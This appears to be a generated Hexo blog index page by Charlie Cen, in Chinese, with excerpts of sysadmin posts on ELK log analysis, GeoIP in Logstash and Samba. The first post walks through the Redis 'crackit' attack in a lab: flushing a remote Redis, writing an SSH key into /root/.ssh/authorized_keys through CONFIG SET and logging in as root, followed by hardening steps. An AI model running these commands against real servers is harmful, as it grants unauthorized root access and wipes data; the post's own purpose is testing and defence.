@@ -1,0 +1,1961 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <meta name="renderer" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" >
+  <link rel="dns-prefetch" href="http://yoursite.com">
+  <title>Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta property="og:type" content="website">
+<meta property="og:title" content="Hexo">
+<meta property="og:url" content="http://yoursite.com/page/3/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Hexo">
+  
+    <link rel="alternative" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link rel="stylesheet" type="text/css" href="/./main.2d7529.css">
+  <style type="text/css">
+  
+    #container.show {
+      background: linear-gradient(200deg,#a0cfe4,#e8c37e);
+    }
+  </style>
+  
+
+  
+
+</head>
+
+<body>
+  <div id="container" q-class="show:isCtnShow">
+    <canvas id="anm-canvas" class="anm-canvas"></canvas>
+    <div class="left-col" q-class="show:isShow">
+      
+<div class="overlay" style="background: #4d4d4d"></div>
+<div class="intrude-less">
+	<header id="header" class="inner">
+		<a href="/" class="profilepic">
+			<img src="https://avatars0.githubusercontent.com/u/6268321?v=3&amp;u=9a7e8f17793429a6009083c23956dcfadf170fc2&amp;s=400" class="js-avatar">
+		</a>
+		<hgroup>
+		  <h1 class="header-author"><a href="/">Charlie Cen</a></h1>
+		</hgroup>
+		
+
+		<nav class="header-menu">
+			<ul>
+			
+				<li><a href="/">主页</a></li>
+	        
+				<li><a href="/archives">所有文章</a></li>
+	        
+			</ul>
+		</nav>
+		<nav class="header-smart-menu">
+    		
+    			
+    			<a q-on="click: openSlider(e, 'innerArchive')" href="javascript:void(0)">所有文章</a>
+    			
+            
+    			
+    			<a q-on="click: openSlider(e, 'aboutme')" href="javascript:void(0)">关于我</a>
+    			
+            
+		</nav>
+		<nav class="header-nav">
+			<div class="social">
+				
+					<a class="github" target="_blank" href="https://github.com/charliecen" title="github"><i class="icon-github"></i></a>
+		        
+					<a class="weibo" target="_blank" href="http://weibo.com/u/2139635283/home" title="weibo"><i class="icon-weibo"></i></a>
+		        
+			</div>
+		</nav>
+	</header>		
+</div>
+
+    </div>
+    <div class="mid-col" q-class="show:isShow,hide:isShow|isFalse">
+      
+<nav id="mobile-nav">
+  	<div class="overlay js-overlay" style="background: #4d4d4d"></div>
+	<div class="btnctn js-mobile-btnctn">
+  		<div class="slider-trigger list" q-on="click: openSlider(e)"><i class="icon icon-sort"></i></div>
+	</div>
+	<div class="intrude-less">
+		<header id="header" class="inner">
+			<div class="profilepic">
+				<img src="https://avatars0.githubusercontent.com/u/6268321?v=3&amp;u=9a7e8f17793429a6009083c23956dcfadf170fc2&amp;s=400" class="js-avatar">
+			</div>
+			<hgroup>
+			  <h1 class="header-author js-header-author">Charlie Cen</h1>
+			</hgroup>
+			
+			
+			
+				
+			
+				
+			
+			
+			
+			<nav class="header-nav">
+				<div class="social">
+					
+						<a class="github" target="_blank" href="https://github.com/charliecen" title="github"><i class="icon-github"></i></a>
+			        
+						<a class="weibo" target="_blank" href="http://weibo.com/u/2139635283/home" title="weibo"><i class="icon-weibo"></i></a>
+			        
+				</div>
+			</nav>
+
+			<nav class="header-menu js-header-menu">
+				<ul style="width: 50%">
+				
+				
+					<li style="width: 50%"><a href="/">主页</a></li>
+		        
+					<li style="width: 50%"><a href="/archives">所有文章</a></li>
+		        
+				</ul>
+			</nav>
+		</header>				
+	</div>
+	<div class="mobile-mask" style="display:none" q-show="isShow"></div>
+</nav>
+
+      <div id="wrapper" class="body-wrap">
+        <div class="menu-l">
+          <div class="canvas-wrap">
+            <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
+          </div>
+          <div id="js-content" class="content-ll">
+            
+  
+    <article id="post-redis-crackit-leak-testing" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2015/11/12/redis-crackit-leak-testing/">Redis-Crackit漏洞测试</a>
+    </h1>
+  
+
+        
+        <a href="/2015/11/12/redis-crackit-leak-testing/" class="archive-article-date">
+  	<time datetime="2015-11-12T13:57:58.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2015-11-12</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>目前redis crackit漏洞爆出可以通过系统shell登录。免密码的，所以这个是很严重的。</p>
+<p>下面我自己测试了下，并有几条防范措施。</p>
+<div>环境：</div><br><div>客户端：10.19.21.241</div><br><div>服务端：10.19.21.242（此服务器运行redis服务的用户是root，如果不是root不能测试。）</div><br><div></div>
+
+<h3 id="1-首先客户端生成ssh-key"><a href="#1-首先客户端生成ssh-key" class="headerlink" title="1. 首先客户端生成ssh key"></a>1. 首先客户端生成ssh key</h3><div><br><pre class="lang:sh decode:true ">[root@VM-241 ~]# ssh-keygen -t rsa -C “crackit@redis.io”<br>Generating public/private rsa key pair.<br>Enter file in which to save the key (/root/.ssh/id_rsa):<br>Enter passphrase (empty for no passphrase):<br>Enter same passphrase again:<br>Your identification has been saved in /root/.ssh/id_rsa.<br>Your public key has been saved in /root/.ssh/id_rsa.pub.<br>The key fingerprint is:<br>bb:16:6e:39:57:d4:b7:c0:dc:ed:05:80:a5:4e:7d:ae crackit@redis.io<br>The key’s randomart image is:<br>+–[ RSA 2048]—-+<br>|           oo.   |<br>|          .o  .  |<br>|          o +.o..|<br>|         o  .<em>..+|<br>|        S ..  ooo|<br>|        ..  .. ..|<br>|       ..o .E    |<br>|        </em>..      |<br>|       o.o       |<br>+—————–+</pre><br><br>### 2. 给公钥添加换行<br><br><pre class="lang:sh decode:true ">[root@VM-241 ~]# (echo -e “\n\n”; cat /root/.ssh/id_rsa.pub; echo -e “\n\n”) &gt; redis.txt</pre><br><br>### 3. 清空服务器redis数据（慎重操作）<br><br><pre class="lang:sh decode:true ">[root@VM-241 ~]# redis-cli -h 10.19.21.242 flushall<br>OK</pre><br><br>### 4. 将公钥写入到redis的key中<br><br><pre class="lang:sh decode:true ">[root@VM-241 ~]# cat redis.txt |redis-cli -h 10.19.21.242 -x set redis<br>OK</pre><br><br>### 5. 连接redis服务器<br><br><pre class="lang:sh decode:true ">[root@VM-241 ~]# redis-cli -h 10.19.21.242<br>redis 10.19.21.242:6379&gt; config set dir /root/.ssh #设置rdb存放路径<br>OK<br>redis 10.19.21.242:6379&gt; config set dbfilename “authorized_keys” #设置rdb文件的文件名<br>OK<br>redis 10.19.21.242:6379&gt; save<br>OK<br>redis 10.19.21.242:6379&gt; exit</pre><br><br>### 6. 尝试登录<br><br><pre class="lang:sh decode:true ">[root@VM-241 ~]# ssh root@10.19.21.242<br>The authenticity of host ‘10.19.21.242 (10.19.21.242)’ can’t be established.<br>RSA key fingerprint is 12:79:d4:36:00:1d:de:48:13:bc:eb:e7:ca:83:84:c3.<br>Are you sure you want to continue connecting (yes/no)? yes<br>Warning: Permanently added ‘10.19.21.242’ (RSA) to the list of known hosts.<br>Last login: Wed Apr 15 19:16:22 2015 from 10.19.10.25<br>[root@VM-242 ~]#<br><br>查看公钥内容<br>[root@VM-242 ~]# cat /root/.ssh/authorized_keys<br>REDIS0002?redisA?<br><br>ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAwUkf3THelm1tARScEkGDZkHiixtBUiS7nW6ShdIcK0apiL+/7CYh/SrCX1k9X0+wFhhNbdQBdz+AIPpQA2UlhAogsj6YRR1vXYORumw2tRmAkxBifvsV/ZZs54u50O6NmMesZRfkzMqskoZCwNVKbzPWuXKmcrIyBnQzRp9NL7YjQXQnAqkD7btGjpdZZudqr/IUnkcS1i8dAbRnF0jQybrT8NnbiqOWVnuIhlXVgnASdI+Qq/p0w83HuuivXZLMMuIwfU9Tj30hV+haqatib1L0G+QyUBpgVmxuUZJrGlMsM+Nj15K8TIPeK4cQ419SbbJXrkqWX2fPok7+9iiD6w== crackit@redis.io<br><br>?[root@VM-242 ~]# exit</pre><br>这样表示这台服务器被外部控制<br><br>### 7. 如何防护<br><br>##### 7.1 在服务器端禁用flushall命令。<br><br><pre class="lang:sh decode:true">[root@VM-242 ~]# echo ‘rename-command flushall “”‘ &gt;&gt; /etc/redis.conf<br>[root@VM-242 ~]# /etc/init.d/redis restart</pre><br><br>##### 客户端测试<br><br><pre class="lang:sh decode:true ">[root@VM-241 ~]# redis-cli -h 10.19.21.242 flushall<br>(error) ERR unknown command ‘flushall’</pre><br><br>##### 7.2 服务器端设置redis的监听地址为127.0.0.1<br><br><div><br><pre class="lang:sh decode:true ">[root@VM-242 ~]# vim /etc/redis.conf<br>bind 127.0.0.1</pre><br><br>##### 7.3 建议不要用root用户运行。我是yum安装，默认启动用户是redis，为了测试，在服务里更改成root。大家测试也可以这么修改。<br><br><pre class="lang:sh decode:true ">[root@VM-242 ~]# vim /etc/init.d/redis<br>start() {<br>    [ -f $REDIS_CONFIG ] || exit 6<br>    [ -x $exec ] || exit 5<br>    echo -n $”Starting $name: “<br>    #daemon –user ${REDIS_USER-redis} “$exec $REDIS_CONFIG”<br>    daemon –user root  “$exec $REDIS_CONFIG”<br>    retval=$?<br>    echo<br>    [ $retval -eq 0 ] &amp;&amp; touch $lockfile<br>    return $retval<br>}</pre><br><br>##### 7.4 设置redis服务器密码<br><br><div><br><pre class="lang:sh decode:true ">[root@VM-242 ~]# echo “requirepass  xxoo” &gt;&gt; /etc/redis.conf</pre><br>&nbsp;<br><br></div><br></div><br></div>
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">redis-crackit</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">redis漏洞</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+	<div class="article-category tagcloud">
+		<i class="icon-book icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="/categories/Redis/" class="article-tag-list-link color1">Redis</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2015/11/12/redis-crackit-leak-testing/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+
+
+
+
+
+
+
+  
+    <article id="post-elk-shown-in-the-users-location" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2015/10/29/elk-shown-in-the-users-location/">ELK中展示用户位置</a>
+    </h1>
+  
+
+        
+        <a href="/2015/10/29/elk-shown-in-the-users-location/" class="archive-article-date">
+  	<time datetime="2015-10-29T17:50:43.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2015-10-29</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>GeoIP 是最常见的免费 IP 地址归类查询库，同时也有收费版可以采购。GeoIP 库可以根据 IP 地址提供对应的地域信息，包括国别，省市，经纬度等，对于可视化地图和区域统计非常有用。</p>
+<p>首先下载地图库</p>
+<p><pre class="lang:sh decode:true ">[root@monitor src]# curl -O <a href="http://geolite.maxmind.com/download/geoip/database/GeoLiteCity.dat.gz" target="_blank" rel="external">http://geolite.maxmind.com/download/geoip/database/GeoLiteCity.dat.gz</a></pre><br>解压并移动到指定目录</p>
+<p><pre class="lang:sh decode:true ">[root@monitor src]# gunzip GeoLiteCity.dat.gz<br>[root@monitor src]# mv GeoLiteCity.dat  /opt/logstash/vendor/geoip/</pre><br>编辑配置文件，filter里更改为如下内容：</p>
+<p><pre class="lang:sh decode:true ">  if [type] == “nginx” {<br>    grok {<br>      match =&gt; { “message” =&gt; “%{NGINXACCESS}” }<br>    }<br>    geoip {<br>      source =&gt; “remote_addr”<br>      target =&gt; “geoip”<br>      database =&gt; “/opt/logstash/vendor/geoip/GeoLiteCity.dat”<br>      add_field =&gt; [ “[geoip][coordinates]”, “%{[geoip][longitude]}” ]<br>      add_field =&gt; [ “[geoip][coordinates]”, “%{[geoip][latitude]}”  ]<br>      remove_field =&gt; [ “[geoip][latitude]”, “[geoip][longitude]” ]<br>    }<br>    mutate {<br>      convert =&gt; [ “[geoip][coordinates]”, “float”]<br>    }<br>  }</pre><br>重启logstash服务</p>
+<p><pre class="lang:sh decode:true ">[root@monitor geoip]# /etc/init.d/logstash restart<br>Killing logstash (pid 29959) with SIGTERM<br>Waiting logstash (pid 29959) to die…<br>Waiting logstash (pid 29959) to die…<br>logstash stopped.<br>logstash started.</pre><br>打开浏览器，查看日志新加入的field</p>
+<p><img src="http://www.cenhq.com/wp-content/uploads/2015/10/QQ20151029-0@2x.png" alt=""></p>
+<p>创建可视化</p>
+<p><img src="http://www.cenhq.com/wp-content/uploads/2015/10/QQ20151029-1@2x.png" alt=""></p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">geoip</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">kibana</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+	<div class="article-category tagcloud">
+		<i class="icon-book icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="/categories/Elasticsearch/" class="article-tag-list-link color4">Elasticsearch</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="/categories/Kibana/" class="article-tag-list-link color2">Kibana</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="/categories/Logstash/" class="article-tag-list-link color4">Logstash</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2015/10/29/elk-shown-in-the-users-location/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+
+
+
+
+
+
+
+  
+    <article id="post-logstash-elasticsearch-kibana-analysis-system-build" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2015/10/29/logstash-elasticsearch-kibana-analysis-system-build/">搭建ELK(Logstash+Elasticsearch+Kibana)日志分析系统</a>
+    </h1>
+  
+
+        
+        <a href="/2015/10/29/logstash-elasticsearch-kibana-analysis-system-build/" class="archive-article-date">
+  	<time datetime="2015-10-29T17:20:44.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2015-10-29</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>Logstash：负责日志的收集，处理和储存<br>Elasticsearch：负责日志检索和分析<br>Kibana：负责日志的可视化</p>
+<h3 id="1-系统环境："><a href="#1-系统环境：" class="headerlink" title="1. 系统环境："></a>1. 系统环境：</h3><pre class="lang:sh decode:true ">[root@monitor ~]# cat /etc/redhat-release 
+CentOS release 6.6 (Final)</pre>
+检测主机名
+<pre class="lang:sh decode:true ">[root@monitor ~]# hostname -f
+monitor</pre>
+安装java
+<pre class="lang:sh decode:true ">[root@monitor ~]# yum install java-1.8.0-openjdk
+查看java版本
+[root@monitor ~]# java -version
+openjdk version "1.8.0_65"
+OpenJDK Runtime Environment (build 1.8.0_65-b17)
+OpenJDK 64-Bit Server VM (build 25.65-b01, mixed mode)</pre>
+
+<h3 id="2-安装logstash"><a href="#2-安装logstash" class="headerlink" title="2. 安装logstash"></a>2. 安装logstash</h3><p>yum安装</p>
+<pre class="lang:sh decode:true ">[root@monitor ~]# yum install https://download.elastic.co/logstash/logstash/packages/centos/logstash-1.5.4-1.noarch.rpm</pre>
+创建证书
+<pre class="lang:sh decode:true ">[root@monitor ~]# cd /etc/pki/tls
+[root@monitor tls]# openssl req -subj '/CN=monitor/' -x509 -days 3650 -batch -nodes -newkey rsa:2048 -keyout private/logstash-forwarder.key -out certs/logstash-forwarder.crt
+Generating a 2048 bit RSA private key
+...................................................+++
+...........................................................................................................+++
+writing new private key to 'private/logstash-forwarder.key'
+-----</pre>
+同步证书到客户端
+<pre class="lang:sh decode:true ">[root@monitor tls]# scp /etc/pki/tls/certs/logstash-forwarder.crt root@baicare:/etc/pki/tls/certs/</pre>
+创建patterns目录，并编写nginx-grok
+<pre class="lang:sh decode:true ">[root@monitor tls]# mkdir /opt/logstash/patterns
+[root@monitor tls]# vim /opt/logstash/patterns/nginx
+NGUSERNAME [a-zA-Z\.\@\-\+_%]+
+NGUSER %{NGUSERNAME}
+NGINXACCESS %{IPORHOST:slb_addr} - - \[%{HTTPDATE:time_local}\] "%{WORD:method} %{URIPATH:path}(?:%{URIPARAM:param})? HTTP/%{NUMBER:httpversion}" %{INT:status} %{INT:body_bytes_sent} %{QS:http_referer} %{QS:http_user_agent} "%{IPORHOST:remote_addr}"</pre>
+编辑配置文件
+<pre class="lang:sh decode:true">root@monitor tls]# vim /etc/logstash/conf.d/logstash.conf
+input {
+  lumberjack {
+    port =&gt; 5000
+    type =&gt; "logs"
+    ssl_certificate =&gt; "/etc/pki/tls/certs/logstash-forwarder.crt"
+    ssl_key =&gt; "/etc/pki/tls/private/logstash-forwarder.key"
+  }
+}
+
+filter {
+  if [type] == "syslog" {
+    grok {
+      match =&gt; { "message" =&gt; "%{SYSLOGTIMESTAMP:syslog_timestamp} %{SYSLOGHOST:syslog_hostname} %{DATA:syslog_program}(?:\[%{POSINT:syslog_pid}\])?: %{GREEDYDATA:syslog_message}" }
+      add_field =&gt; [ "received_at", "%{@timestamp}" ]
+      add_field =&gt; [ "received_from", "%{host}" ]
+    }
+    syslog_pri { }
+    date {
+      match =&gt; [ "syslog_timestamp", "MMM  d HH:mm:ss", "MMM dd HH:mm:ss" ]
+    }
+  }
+  if [type] == "nginx" {
+    grok {
+       match =&gt; { "message" =&gt; "%{NGINXACCESS}" }
+    }
+  }
+}
+
+output {
+  elasticsearch { host =&gt; localhost }
+  stdout { codec =&gt; rubydebug }
+</pre>
+启动服务
+<pre class="lang:sh decode:true ">[root@monitor ~]# /etc/init.d/logstash start
+[root@monitor ~]# chkconfig logstash on</pre>
+
+<h3 id="3-安装elasticsearch"><a href="#3-安装elasticsearch" class="headerlink" title="3. 安装elasticsearch"></a>3. 安装elasticsearch</h3><p>yum安装</p>
+<pre class="lang:sh decode:true ">[root@monitor ~]# yum install https://download.elastic.co/elasticsearch/elasticsearch/elasticsearch-1.7.1.noarch.rpm</pre>
+添加到开机启动，并启动服务
+<pre class="lang:sh decode:true">[root@monitor ~]# chkconfig --add elasticsearch
+[root@monitor ~]# service elasticsearch start
+Starting elasticsearch:                                    [  OK  ]
+[root@monitor ~]# netstat -lutnp |grep java
+tcp        0      0 0.0.0.0:9300                0.0.0.0:*                   LISTEN      26898/java          
+tcp        0      0 0.0.0.0:9200                0.0.0.0:*                   LISTEN      26898/java          
+udp        0      0 0.0.0.0:54328               0.0.0.0:*                               26898/java          
+</pre>
+测试是否能正常访问
+<pre class="lang:sh decode:true ">[root@monitor ~]# curl -X GET http://localhost:9200
+{
+  "status" : 200,
+  "name" : "Conquistador",
+  "cluster_name" : "elasticsearch",
+  "version" : {
+    "number" : "1.7.1",
+    "build_hash" : "b88f43fc40b0bcd7f173a1f9ee2e97816de80b19",
+    "build_timestamp" : "2015-07-29T09:54:16Z",
+    "build_snapshot" : false,
+    "lucene_version" : "4.10.4"
+  },
+  "tagline" : "You Know, for Search"
+}</pre>
+
+<h3 id="4-安装kibana"><a href="#4-安装kibana" class="headerlink" title="4.安装kibana"></a>4.安装kibana</h3><p>下载源码包</p>
+<pre class="lang:sh decode:true ">[root@monitor ~]# wget https://download.elastic.co/kibana/kibana/kibana-4.1.1-linux-x64.tar.gz</pre>
+解压并重命名
+<pre class="lang:sh decode:true ">[root@monitor ~]# tar xf kibana-4.1.1-linux-x64.tar.gz -C /usr/local/
+[root@monitor ~]# mv /usr/local/kibana-4.1.1-linux-x64 /usr/local/kibana</pre>
+编写启动脚本
+<pre class="lang:sh decode:true">[root@monitor ~]# vim /etc/rc.d/init.d/kibana
+#!/bin/bash
+# BEGIN INIT INFO
+# Provides:          kibana
+# Default-Start:     2 3 4 5
+# Default-Stop:      0 1 6
+# Short-Description: Runs kibana daemon
+# Description: Runs the kibana daemon as a non-root user
+### END INIT INFO
+
+# Process name
+NAME=kibana
+DESC="Kibana4"
+PROG="/etc/init.d/kibana"
+
+# Configure location of Kibana bin
+KIBANA_BIN=/usr/local/kibana/bin
+
+# PID Info
+PID_FOLDER=/var/run/kibana/
+PID_FILE=/var/run/kibana/$NAME.pid
+LOCK_FILE=/var/lock/subsys/$NAME
+PATH=/bin:/usr/bin:/sbin:/usr/sbin:$KIBANA_BIN
+DAEMON=$KIBANA_BIN/$NAME
+
+# Configure User to run daemon process
+DAEMON_USER=root
+# Configure logging location
+KIBANA_LOG=/var/log/kibana.log
+
+# Begin Script
+RETVAL=0
+
+if [ `id -u` -ne 0 ]; then
+        echo "You need root privileges to run this script"
+        exit 1
+fi
+
+# Function library
+. /etc/init.d/functions
+
+start() {
+        echo -n "Starting $DESC : "
+
+pid=`pidofproc -p $PID_FILE kibana`
+        if [ -n "$pid" ] ; then
+                echo "Already running."
+                exit 0
+        else
+        # Start Daemon
+if [ ! -d "$PID_FOLDER" ] ; then
+                        mkdir $PID_FOLDER
+                fi
+daemon --user=$DAEMON_USER --pidfile=$PID_FILE $DAEMON 1&gt;"$KIBANA_LOG" 2&gt;&amp;1 &amp;
+                sleep 2
+                pidofproc node &gt; $PID_FILE
+                RETVAL=$?
+                [[ $? -eq 0 ]] &amp;&amp; success || failure
+echo
+                [ $RETVAL = 0 ] &amp;&amp; touch $LOCK_FILE
+                return $RETVAL
+        fi
+}
+
+reload()
+{
+    echo "Reload command is not implemented for this service."
+    return $RETVAL
+}
+
+stop() {
+        echo -n "Stopping $DESC : "
+        killproc -p $PID_FILE $DAEMON
+        RETVAL=$?
+echo
+        [ $RETVAL = 0 ] &amp;&amp; rm -f $PID_FILE $LOCK_FILE
+}
+
+case "$1" in
+  start)
+        start
+;;
+  stop)
+        stop
+        ;;
+  status)
+        status -p $PID_FILE $DAEMON
+        RETVAL=$?
+        ;;
+  restart)
+        stop
+        start
+        ;;
+  reload)
+reload
+;;
+  *)
+# Invalid Arguments, print the following message.
+        echo "Usage: $0 {start|stop|status|restart}" &gt;&amp;2
+exit 2
+        ;;
+esac</pre>
+启动服务
+<pre class="lang:sh decode:true ">[root@monitor local]# chmod +x /etc/rc.d/init.d/kibana
+[root@monitor local]# /etc/init.d/kibana start
+Starting Kibana4 :                                         [确定]
+[root@monitor local]# chkconfig kibana on
+
+[root@monitor local]# netstat -lutnp |grep java
+tcp        0      0 0.0.0.0:9300                0.0.0.0:*                   LISTEN      26898/java          
+tcp        0      0 0.0.0.0:9200                0.0.0.0:*                   LISTEN      26898/java          
+udp        0      0 0.0.0.0:54328               0.0.0.0:*                               26898/java   
+</pre>
+
+<h3 id="5-配置nginx"><a href="#5-配置nginx" class="headerlink" title="5. 配置nginx"></a>5. 配置nginx</h3><p>编辑配置文件</p>
+<pre class="lang:sh decode:true">[root@monitor vhost]# vim kibana.conf
+server {
+     listen 80;
+     server_name kibana.baicare.com;
+
+     location / {
+         proxy_pass http://127.0.0.1:5601;
+         root /usr/local/kibana/src;
+         auth_basic "Restricted";
+         auth_basic_user_file /usr/local/nginx/conf/kibana.htpasswd;
+     }
+}</pre>
+创建登录账号密码
+<pre class="lang:sh decode:true">[root@monitor geoip]# htpasswd -c /usr/local/nginx/conf/kibana.htpasswd charlie
+New password: 
+Re-type new password: 
+Adding password for user charlie</pre>
+启动服务
+<pre class="lang:sh decode:true ">[root@monitor vhost]# nginx -t
+nginx: the configuration file /usr/local/nginx/conf/nginx.conf syntax is ok
+nginx: configuration file /usr/local/nginx/conf/nginx.conf test is successful
+[root@monitor vhost]# nginx -s reload</pre>
+
+<h4 id="以上是服务器端配置，下面是客户端配置"><a href="#以上是服务器端配置，下面是客户端配置" class="headerlink" title="以上是服务器端配置，下面是客户端配置"></a><span style="color: #800000;">以上是服务器端配置，下面是客户端配置</span></h4><p>&nbsp;</p>
+<h3 id="6-安装logstash-forwarder"><a href="#6-安装logstash-forwarder" class="headerlink" title="6. 安装logstash-forwarder"></a>6. 安装logstash-forwarder</h3><p>yum安装logstash-forwarder</p>
+<p><pre class="lang:sh decode:true">[root@baicare ~]# yum install -y <a href="https://download.elastic.co/logstash-forwarder/binaries/logstash-forwarder-0.4.0-1.x86_64.rpm" target="_blank" rel="external">https://download.elastic.co/logstash-forwarder/binaries/logstash-forwarder-0.4.0-1.x86_64.rpm</a><br>[root@baicare ~]# cp /etc/logstash-forwarder.conf /etc/logstash-forwarder.conf.bak</pre><br>编辑配置</p>
+<p><pre class="lang:sh decode:true ">{<br>  “network”: {<br>    “servers”: [ “monitor:5000” ],</pre></p>
+<pre><code>&quot;ssl ca&quot;: &quot;/etc/pki/tls/certs/logstash-forwarder.crt&quot;,
+
+&quot;timeout&quot;: 15
+</code></pre><p>  },</p>
+<p>  “files”: [<br>    {<br>      “paths”: [<br>        “/var/log/messages”,<br>        “/var/log/secure”<br>      ],<br>      “fields”: { “type”: “syslog” }<br>    }, {<br>      “paths”: [<br>        “/home/wwwlogs/access_nginx.log”<br>      ],<br>      “fields”: { “type”: “nginx” }<br>    }<br>  ]<br>}<br>启动服务</p>
+<p><pre class="lang:sh decode:true ">[root@baicare src]# /etc/init.d/logstash-forwarder start<br>logstash-forwarder started</pre><br>然后打开浏览器，访问服务器（域名解析提前做好）</p>
+<h3 id="7-配置索引模式"><a href="#7-配置索引模式" class="headerlink" title="7. 配置索引模式"></a>7. 配置索引模式</h3><p><img src="http://www.cenhq.com/wp-content/uploads/2015/10/QQ20151029-2@2x.png" alt=""></p>
+<p><img src="http://www.cenhq.com/wp-content/uploads/2015/10/QQ20151029-3@2x.png" alt=""></p>
+<p>&nbsp;</p>
+<p>参考文章：</p>
+<p>ELKstack 中文指南 - <a href="http://kibana.logstash.es/" target="_blank" rel="external">http://kibana.logstash.es/</a><br>三斗室 - <a href="http://chenlinux.com/" target="_blank" rel="external">http://chenlinux.com/</a><br>elastic - <a href="https://www.elastic.co/guide" target="_blank" rel="external">https://www.elastic.co/guide</a><br>LTMP索引 - <a href="http://wsgzao.github.io/index/#LTMP" target="_blank" rel="external">http://wsgzao.github.io/index/#LTMP</a></p>
+<p>&nbsp;</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">kibana</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">elasticsearch</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">logstash</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+	<div class="article-category tagcloud">
+		<i class="icon-book icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="/categories/Elasticsearch/" class="article-tag-list-link color4">Elasticsearch</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="/categories/Kibana/" class="article-tag-list-link color2">Kibana</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="/categories/Logstash/" class="article-tag-list-link color4">Logstash</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2015/10/29/logstash-elasticsearch-kibana-analysis-system-build/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+
+
+
+
+
+
+
+  
+    <article id="post-samba-service-build" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2015/10/23/samba-service-build/">samba服务搭建</a>
+    </h1>
+  
+
+        
+        <a href="/2015/10/23/samba-service-build/" class="archive-article-date">
+  	<time datetime="2015-10-23T16:47:50.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2015-10-23</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <div>好久没弄这个，今天朋友问我samba服务问题。又重新弄了一遍，加深下记忆。</div><br><div></div><br><div>系统：centos6.7</div><br><div></div>
+
+<h3 id="1-安装"><a href="#1-安装" class="headerlink" title="1. 安装"></a>1. 安装</h3><pre class="lang:sh decode:true">[root@VM-241 ~]# yum install -y samba samba-client</pre>
+
+<h3 id="2-修改配置文件"><a href="#2-修改配置文件" class="headerlink" title="2. 修改配置文件"></a>2. 修改配置文件</h3><pre class="lang:sh decode:true">[root@VM-241 ~]# vim /etc/samba/smb.conf
+    [global]
+    workgroup = MYGROUP
+    server string = Samba Server Version %v
